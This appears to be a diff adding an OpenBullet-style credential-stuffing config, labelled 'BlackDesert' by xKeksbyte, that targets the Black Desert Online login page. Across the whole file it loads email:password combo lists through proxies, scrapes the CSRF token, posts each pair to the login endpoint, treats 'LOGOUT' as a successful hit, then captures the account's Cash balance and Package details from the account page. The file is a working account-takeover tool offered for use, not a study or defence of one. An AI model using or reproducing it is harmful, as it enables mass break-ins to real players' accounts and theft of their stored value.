@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "BlackDesert",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-17T07:53:00.4730569+02:00",
+  "AdditionalInfo": "",
+  "Author": "xKeksbyte",
+  "Version": "1.2.8 Modded",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#First_Request_to_get_CSRF REQUEST GET "https://www.blackdesertonline.com/login?returnUrl=%2F%3Fre%3Dlogin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "id=\"_csrf\" name=\"_csrf\" value=\"" "\">" -> CAP "Token" 
+
+#Login REQUEST POST "https://www.blackdesertonline.com/login" 
+  CONTENT "accessToken=&socialId=&socialType=&tsvToken=&password_more=&restoreKey=&returnUrl=%252F%253Fre%253Dlogin&ept=&_csrf=<Token>&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Host: www.blackdesertonline.com" 
+  HEADER "Origin: https://www.blackdesertonline.com" 
+  HEADER "Referer: https://www.blackdesertonline.com/login?returnUrl=%2F%3Fre%3Dlogin" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Login Error" 
+    KEY "<SOURCE>" DoesNotContain "LOGOUT" 
+  KEYCHAIN Success OR 
+    KEY "LOGOUT" 
+
+#MyInfo REQUEST GET "https://www.blackdesertonline.com/myinfo/?lang=EN" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Cash PARSE "<SOURCE>" LR "class=\"txt_num\">" "</span> Cash</dd>" -> CAP "Cash" 
+
+PARSE "<SOURCE>" LR "<span>" "</span>" -> CAP "Package" 
+
